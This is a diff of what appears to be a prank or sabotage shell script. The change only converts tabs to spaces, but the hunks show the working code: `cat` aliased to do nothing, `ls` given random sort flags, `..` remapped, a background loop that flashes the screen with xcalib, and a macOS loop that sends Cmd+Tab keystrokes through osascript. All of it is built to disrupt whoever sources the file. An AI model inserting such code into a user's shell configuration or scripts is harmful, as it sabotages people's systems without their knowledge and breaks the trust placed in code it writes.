@@ -11,7 +11,7 @@ alias cat=true
 
 # Use a random sort option whenever `ls` is invoked.
 function ls {
-	command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"
+  command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"
 }
 
 # Have `date` return random dates.
@@ -37,12 +37,12 @@ alias -g ..='.'
 
 # Flash screen every minute or so
 if command -v xcalib >/dev/null 2>&1; then
-	sh -c 'sleep 120s; while :; do xcalib -i -a; xcalib -i -a; sleep $[($RANDOM % 60) + 60]s; done' > /dev/null 2>&1 &
+  sh -c 'sleep 120s; while :; do xcalib -i -a; xcalib -i -a; sleep $[($RANDOM % 60) + 60]s; done' > /dev/null 2>&1 &
 fi
 
 # cmd + tab every minute or so
 if [[ "$OSTYPE" == darwin* ]]; then
-	sh -c 'sleep 120s; while :; do osascript <<EOD
+  sh -c 'sleep 120s; while :; do osascript <<EOD
 tell application "System Events"
     key code 48 using command down
 end tell
